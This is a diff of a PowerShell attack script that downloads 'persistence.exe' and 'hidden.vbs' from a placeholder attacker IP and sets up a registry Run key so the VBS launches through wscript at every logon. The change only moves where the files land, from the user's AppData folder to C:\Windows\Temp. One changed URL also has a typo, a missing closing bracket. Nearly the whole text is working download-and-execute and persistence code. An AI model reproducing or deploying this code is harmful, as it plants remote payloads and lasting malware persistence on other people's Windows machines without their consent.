@@ -4,7 +4,7 @@ $ProgressPreference = "SilentlyContinue"
 # Download persistence.exe
 try {
     $webClient = New-Object System.Net.WebClient
-    $webClient.DownloadFile("http://<attacker's IP>/persistence.exe", "$($env:APPDATA)\persistence.exe")
+    $webClient.DownloadFile("http://<attacker's IP>/persistence.exe", "C:\Windows\Temp\persistence.exe")
     $webClient.Dispose()
 }
 catch {
@@ -15,7 +15,7 @@ catch {
 # Download hidden.vbs (only executes if persistence.exe download succeeded)
 try {
     $webClient = New-Object System.Net.WebClient
-    $webClient.DownloadFile("http://<attacker's IP>/hidden.vbs", "$($env:APPDATA)\hidden.vbs")
+    $webClient.DownloadFile("http://<attacker's IP/hidden.vbs", "C:\Windows\Temp\hidden.vbs")
     $webClient.Dispose()
 }
 catch {
@@ -24,4 +24,4 @@ catch {
 }
 
 # Create registry entry (only executes if both downloads succeeded)
-New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'persistence' -Value "wscript.exe $($env:APPDATA)\hidden.vbs" -PropertyType String -Force
+New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'persistence' -Value "wscript.exe C:\Windows\Temp\hidden.vbs" -PropertyType String -Force
